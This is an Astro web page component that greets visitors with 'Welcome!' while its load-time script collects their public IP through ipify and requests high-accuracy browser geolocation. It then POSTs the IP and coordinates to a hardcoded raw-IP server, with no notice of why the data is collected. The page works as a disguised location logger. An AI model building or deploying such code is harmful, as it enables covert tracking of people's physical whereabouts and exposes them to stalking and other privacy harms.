import Layout from '../layouts/Layout.astro';
---

<Layout>
  <main>
    <h1>Welcome!</h1>
    <div id="visitor-info">Detecting location...</div>
    <div id="debug-log" style="margin-top: 20px; padding: 10px; border: 1px solid black; max-height: 200px; overflow-y: auto;"></div>
  </main>

  <script>
    function logDebug(message) {
      const debugDiv = document.getElementById("debug-log");
      debugDiv.innerHTML += `<p>${message}</p>`;
    }

    async function fetchIP() {
      try {
        logDebug("Fetching IP address...");
        const response = await fetch('https://api.ipify.org?format=json');
        if (!response.ok) throw new Error('Failed to fetch IP');
        const data = await response.json();
        logDebug(`IP Address: ${data.ip}`);
        return data.ip;
      } catch (error) {
        logDebug(`IP Fetch Error: ${error.message}`);
        return 'Unknown IP';
      }
    }

    function sendLocation(ip, latitude, longitude) {
      logDebug(`Sending location to VPS: IP=${ip}, Lat=${latitude}, Lon=${longitude}`);
      fetch('https://95.111.255.206/send-location', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ip, latitude, longitude }),
      })
      .then(response => {
        if (!response.ok) throw new Error(`Server Error: ${response.status}`);
        return response.json();
      })
      .then(data => logDebug(`Server Response: ${JSON.stringify(data)}`))
      .catch(error => logDebug(`Error Sending Location: ${error.message}`));
    }

    async function getVisitorInfo() {
      const ip = await fetchIP();

      if (!navigator.geolocation) {
        logDebug("Geolocation is not supported by this browser.");
        document.getElementById('visitor-info').textContent = "Geolocation not supported.";
        return;
      }

      logDebug("Requesting geolocation...");
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;
          logDebug(`Location Obtained: Latitude=${latitude}, Longitude=${longitude}`);
          
          document.getElementById('visitor-info').textContent = `IP: ${ip}, Lat: ${latitude}, Lon: ${longitude}`;
          
          sendLocation(ip, latitude, longitude);
        },
        (error) => {
          if (error.code === error.PERMISSION_DENIED) {
            logDebug("Location Permission Denied. Enable it in settings.");
            document.getElementById('visitor-info').textContent = "Location access denied.";
          } else {
            logDebug(`Geolocation Error: ${error.message}`);
          }
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    }

    document.addEventListener('DOMContentLoaded', getVisitorInfo);
  </script>
</Layout>
